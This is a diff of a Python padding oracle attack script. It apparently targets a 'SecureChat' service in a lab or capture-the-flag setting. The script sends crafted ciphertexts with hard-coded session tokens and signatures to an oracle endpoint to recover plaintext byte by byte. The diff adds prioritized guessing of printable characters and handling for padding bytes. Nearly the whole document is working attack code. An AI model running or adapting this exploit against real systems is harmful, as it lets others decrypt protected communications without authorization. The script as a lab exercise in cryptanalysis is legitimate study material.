@@ -1,4 +1,3 @@
-
 import requests
 import base64
 import sys
@@ -16,9 +15,9 @@ PARALLEL_GUESS_BATCH = 2  # Number of parallel guesses to send
 
 def get_token(token = None):
     if not token:
-        return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJTZWN1cmVDaGF0IiwiaWF0IjoxNzY1ODA4ODYwLCJleHAiOjE3NjU4MDkxNjAsInN1YiI6Imdyb3VwLTMiLCJzaWQiOiIzYWQwYzM1OWViODU4MDZjMTViOTBmNzExODc3NDZlZGJjZTc2NmIzZDQyNzU5NzNjNDc1M2U5ZTM5Yjc3YTQwIiwiYWxnb3JpdGhtIjoiZWNkaF8zIiwicHVibGljS2V5Ijp7IngiOiIyODQ5NTU5NDAyNjQ1ODA5NDA1OTk1Mjg4OTc1NTE0OTU3Mjk2ODAxNzg2MjgzNTkxNDcwMDU4MzUyODQ2MzQxMzIzNTMwNDIzODM0MCIsInkiOiIxMTU1OTUzNjA3MDE0MDQ3OTU1MjI1NzkzOTA4NjEyNTkyNDY2NDE5ODA4OTk4ODYxODUyODMyMjU4OTE2NDgwNTQ3MDYwMTU2ODMxMjkifSwiZW5jcnlwdGVkRGF0YSI6IklybGNjWEVGSmVEdjYwODdIbFhGU1VCQ3BzdjZNelV1a1FBcDZScE9EUWVGS2FLemRfQmpJUzl5N2t0S0daU00tQTF6allpQkdqWXZzWUwzY3NOa3lLR1JwazFGcUxzY0JkamtSUTRtQVd1eUNCX3RxRHJ3SnNvWE5kTFgwYnY3LTdXVG5VY2lpM3gtYVJkY01JMnNwV050NF93bVlSRkJBUkxsQXRqX1BjNWRPOGY5Ulc0Z2I5OHM4WXlTc3YxSUg4blgwUU9neEVIM2h5YnNScXFUcGhjV1UzTV94ZkZkdHlfeTZUd3o0ZGZiTzEyZTR1N2Vaa2ZSMmJ3WGVZOU1mSmNsb25mbjUyVjRmZjVJSmE1RTFTVVZaUkEySDV1cjJQQnJoeDBYSkJpWTBEYnZHQWhjYkVpemRZTi03MVEiLCJjcmVhdGVkQXQiOjE3NjU4MDg4NjAxMjIsImxhc3RBY3Rpdml0eSI6MTc2NTgwODg2MDM2M30.g-hPykPJfudY-Uh-2Vldog6eeVy2JiVq-Jp1vTFwFBc"
+        return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJTZWN1cmVDaGF0IiwiaWF0IjoxNzY1ODIwODUxLCJleHAiOjE3NjU4MjExNTEsInN1YiI6Imdyb3VwLTMiLCJzaWQiOiIzY2U3MWQzOTY2MGRhMmQ4NjUwNzcwZjkyZTY3MTcyODRlNTkzYTM4Y2ZhNDJiN2Q5ZTdjZTczMjU0MjMzODA1IiwiYWxnb3JpdGhtIjoiZWNkaF8zIiwicHVibGljS2V5Ijp7IngiOiI2ODcxOTUzMTQwOTg2MTcwMDIxMzc4MzQxNjE0NDExODI3MjIzNjYwNTQ0ODEwOTc0MDI4MDYxODkxODA4MDk5MjEyNTE0ODA0ODA3MCIsInkiOiIxMDY5NDAzNDY0MTkxNDYxODUzNDI1MTEwMTg5NjIzODQzODAyMjA4NjQ4OTYwOTk1NzAyODkzOTc1MzgwMTkxMDAwMTA5MTg5MzUyMjQifSwiZW5jcnlwdGVkRGF0YSI6InM4SHR4LWxGcS1pbDdwT3RaVUdnYTRqUGFRVDNrbk9uZE9Vdy1ac080bVUwMkEwdFVkb1MxR0lJRG82NkR4OVNseDcwNFJXOEs4YmFVenc4NVEweWpGazc5bmE4SUhGb3hJYXBRWEZYSnVhU3JMMHZIVEFKNlpneTQwU2NWbkNoMmo2N0JfZ1RNYkdPWWN6Y2xLdmVjdlhUTGFiN2JsOEp3NzItbmFyaS0tZ0RSNWtLbW9lNkUzSVdSR3pVSHhnem4yUjlNc1F5bmJVMmVkUDFuWGJqa0tUcTM4a0QxYXVQNzJOTVowSm5wWlBZSU5WcjRRUkNpZnEwa2hhSmVHeFB0b1VlQVQyc2dELUlTXzB5bHZQSXQ1TUpFVTYxcFJ4SnltMUw1UERvUWVGYW5fbXdGelNONnUySUkyYW5aWjdIIiwiY3JlYXRlZEF0IjoxNzY1ODIwODUxMjE0LCJsYXN0QWN0aXZpdHkiOjE3NjU4MjA4NTEzNzd9.lcSWaiq3m4tyDFZ-pOb__Sh68PIiR65cJ-D7kvM9uec"
     # print("Getting new token...")
-    payload = {"sessionToken":token,"encryptedMessage":"MGQX4GwMtgc+2SBQwH5HWTGkzl5rHGh1bYHS2Y32iQk=","messageSignature":{"r":"100434844498918931539621415088632182419027377480244682412043633053764908941713","s":"4322233777480666872602431355286828148284378635897332159169297481463049320178","messageHash":"102235061580358138396574908587881386123486953679082475591246987653487726936046","algorithm":"ECDSA-P256"},"clientSignaturePublicKey":{"x":"77475959356485984238669208075409866067894843780826672580548579248052208423804","y":"65151871469570542249818368486322157487425303988256078435808602745832562691219"}}
+    payload = {"sessionToken":token,"encryptedMessage":"dY0Vr0m9hGo9BmCIReOlOAQI7M+R7xmx+jIqO1jZGPY=","messageSignature":{"r":"50052767446999115007139544558069022590329698892787276124929125769040409596919","s":"3015541346334751449345568818104215136357290177841669283539282635497697840668","messageHash":"48210227627143076923532643274900038989816371053307765416190221206156267718683","algorithm":"ECDSA-P256"},"clientSignaturePublicKey":{"x":"7695860974964638194165385659098743832703217848693275908770865929882303517494","y":"83299517118945450340363021820644025943644636754529826527517157261925840868137"}}
     headers = {'X-User-Id': USER_ID}
     try:
         response = requests.post(TARGET_URL, json=payload, headers=headers)
@@ -78,6 +77,50 @@ def oracle_query(ciphertext_bytes, token):
             continue
 
 
+def generate_prioritized_guesses(byte_index, previous_block_byte, padding_value, is_last_block):
+    """
+    Generates a prioritized list of byte values to guess.
+    - For the last byte of the last block, padding values are prioritized.
+    - For other bytes, printable ASCII characters are prioritized.
+    """
+    guesses = []
+    
+    # Priority 1: Printable ASCII characters
+    # plaintext_byte = (guess ^ padding_value) ^ previous_block_byte
+    # guess = (plaintext_byte ^ previous_block_byte) ^ padding_value
+    printable_chars = list(range(ord(' '), ord('~') + 1))
+    
+    # Priority 2: Common control characters
+    control_chars = [0, 10, 13, 9] # NULL, LF, CR, TAB
+
+    # Priority 3: Padding values (from 1 to 16)
+    padding_guesses = []
+    if is_last_block:
+        for pad in range(1, 17):
+            guess = (pad ^ previous_block_byte) ^ padding_value
+            if guess not in padding_guesses:
+                padding_guesses.append(guess)
+
+    # Build the guess list based on priority
+    if is_last_block and byte_index == 15:
+        # For the very last byte, prioritize padding
+        guesses.extend(g for g in padding_guesses if g not in guesses)
+
+    # Add printable chars
+    for char_code in printable_chars + control_chars:
+        guess = (char_code ^ previous_block_byte) ^ padding_value
+        if guess not in guesses:
+            guesses.append(guess)
+    
+    # Add remaining padding guesses
+    guesses.extend(g for g in padding_guesses if g not in guesses)
+
+    # Add all other byte values as a fallback
+    guesses.extend(i for i in range(256) if i not in guesses)
+    
+    return guesses
+
+
 def attempt_guess(guess, byte_index, base_block_bytes, target_block, token):
     """Executes a single oracle guess for a crafted byte value."""
     crafted_block = bytearray(base_block_bytes)
@@ -109,8 +152,11 @@ def padding_oracle_attack(ciphertext_bytes, block_size=16):
             print(f"\nAttacking block {block_index + 1}...")
 
             intermediate_state = bytearray(block_size)
+            is_last_block = (block_index == len(ciphertext_blocks) - 1)
 
-            for byte_index in range(block_size - 1, -1, -1):
+            # Decrypt each byte from last to first
+            byte_index = block_size - 1
+            while byte_index >= 0:
                 padding_value = block_size - byte_index
                 
                 # Prepare prefix with known intermediate values
@@ -126,10 +172,21 @@ def padding_oracle_attack(ciphertext_bytes, block_size=16):
                     token_snapshot = get_token()
                     current_token = token_snapshot
 
-                for batch_start in range(0, 256, PARALLEL_GUESS_BATCH):
-                    batch = list(range(batch_start, min(batch_start + PARALLEL_GUESS_BATCH, 256)))
+                previous_block_byte = previous_block[byte_index]
+                guesses = generate_prioritized_guesses(byte_index, previous_block_byte, padding_value, is_last_block)
+
+                for i in range(0, len(guesses), PARALLEL_GUESS_BATCH):
+                    batch = guesses[i:i + PARALLEL_GUESS_BATCH]
+                    
+                    # Create a visual representation of the characters being guessed
+                    chars_to_try = "','".join([
+                        chr((g ^ padding_value) ^ previous_block_byte)
+                        if 32 <= ((g ^ padding_value) ^ previous_block_byte) <= 126
+                        else '.'
+                        for g in batch
+                    ])
                     print(
-                        f"\rTrying guesses {batch[0]}-{batch[-1]} at byte {byte_index}",
+                        f"\rTrying: '{chars_to_try}' at byte {byte_index} ",
                         end="\r",
                     )
 
@@ -168,13 +225,38 @@ def padding_oracle_attack(ciphertext_bytes, block_size=16):
                     except:
                         char_repr = '<non-printable>'
 
-                    print(f"\nFound byte {16 - byte_index}/{block_size}: {plaintext_byte:02x} ('{char_repr}')")
+                    # Clear the "Trying..." line before printing the result
+                    print(" " * 80, end="\r")
+                    print(f"Found byte {16 - byte_index}/{block_size}: {plaintext_byte:02x} ('{char_repr}')")
+                    
+                    # Handle padding propagation
+                    if is_last_block and byte_index == 15 and 1 < plaintext_byte <= 16:
+                        pad_len = plaintext_byte
+                        print(f"  [+] Detected padding of length {pad_len}. Propagating...")
+                        
+                        # Correctly calculate and fill the rest of the decrypted block
+                        for i in range(1, pad_len):
+                            p_byte_index = 15 - i
+                            p_padding_value = block_size - p_byte_index
+                            
+                            # We know the plaintext is `pad_len`, so we can find the intermediate byte
+                            intermediate_state[p_byte_index] = pad_len ^ previous_block[p_byte_index]
+                            
+                            # We also need to update the known mask for the *next* guess
+                            known_mask[p_byte_index] = intermediate_state[p_byte_index] ^ p_padding_value
+                            
+                            # Prepend the known padding byte to our result
+                            decrypted_block = bytes([pad_len]) + decrypted_block
+
+                        # Skip the bytes we just filled
+                        byte_index -= (pad_len - 1)
+                        
                     refresh_token()
                 else:
                     print(f"  [!] Failed to find byte {16 - byte_index}!")
-                    # Should we exit or likely the intermediate state is wrong?
-                    # Usually means previous bytes were wrong or bad luck with block oracle.
                     break
+                
+                byte_index -= 1
                 
             plaintext = decrypted_block + plaintext
 
@@ -182,7 +264,7 @@ def padding_oracle_attack(ciphertext_bytes, block_size=16):
 
 if __name__ == "__main__":
     # Target ciphertext
-    ciphertext_bytes_base64 = "kwo5VILHFo0ypm98eyh/i7m9iETk9jUekfRr00ty8djZbHmG60SzH+1BAvJc+VlDKdewAHv+gzB/wOwvA3r0vzjCyG0RK2HwEF0n67QQ5MutN5iX6p+LrFOmE1554LubeLiHNI7+NYOKlK/TWEIu1av4v/w/rmBYHjnDvERtiEb+JpUWwluK3B/Nfa+6iYIW"
+    ciphertext_bytes_base64 = "dY0Vr0m9hGo9BmCIReOlOAQI7M+R7xmx+jIqO1jZGPY="
 
     # Run attack
     result = padding_oracle_attack(base64.b64decode(ciphertext_bytes_base64))
